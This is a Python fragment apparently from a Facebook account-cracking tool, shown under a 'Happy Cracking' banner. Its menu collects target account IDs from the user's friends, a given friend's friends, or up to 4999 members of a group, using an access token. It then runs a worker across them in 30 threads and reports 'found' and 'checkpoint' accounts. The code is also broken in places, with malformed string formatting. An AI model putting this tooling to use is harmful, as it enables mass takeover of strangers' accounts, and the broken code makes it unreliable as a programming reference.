def menu(n,toket):
	global loop
	loop=0
	banner()
	print("%s(●) %sHappy Cracking... %s%s"%(G,W,Y,n))
	print("""
%s## %s1 ID FROM YOUR LIST FRIEND
%s## %s2 ID FROM FRIEND
%s## %s3 ID FROM MEMBER GROUP
%s## %s0 Exit the program
"""%(G,W,G,W,G,W,G,R))


	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
	if unikers in [""]:
		exit("%s[!]%s wrong input !!"%(R,W))
    
    
	elif unikers in ["1"]:
		print("\n%s[*]%s from : %s"%(P,W,n))
    
		for z in s.get(url.format("me/friends?access_token=%s"%(toket,timeout=None))).json()["data"]:
			target.append(z["id"])
      
      
	elif unikers in ["2"]:
		try:
			idf = input("\n%s[*] %sID friend : "%(P,W))
			k = s.get(url.format(idf+"?access_token=%s"%(toket,timeout=None))).json()["name"]
		except KeyError:
			exit("%s[!]%s ups sorry friend not found !!"%(R,W))
		print("%s[*]%s from : %s"%(P,W,k))
    
		for f in s.get(url.format(idf+"/friends?access_token=%s"%(toket,timeout=None))).json()["data"]:
			target.append(f["id"])
      
      
	elif unikers in ["3"]:
		try:	
			idg = input("\n%s[*]%s ID group : "%(P,W))
			e = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket,timeout=None))).json()["name"]
		except KeyError:
			exit("%s[!]%s ups sorry group not found !!"%(R,W))
		print("%s[*]%s from : %s"%(P,W,e))
		for y in s.get(url.format(idg+"/members?fields=name,id&limit=4999&access_token=%s"%(toket,timeout=None))).json()["data"]:
			target.append(y["id"])
      
      
	elif unikers in ["0"]:
		os.system("rm -rf cookie")
		exit()
	else:
		exit("%s[!]%s wrong input !!"%(R,W))
		
	print("%s[*]%s Tunggu sebentar..."%(P,W))
	
	m = ThreadPool(30)
	m.map(x,target)
	result(found,checkpoint)
	exit("%s\n[+] %sDone ... "%(R,W))
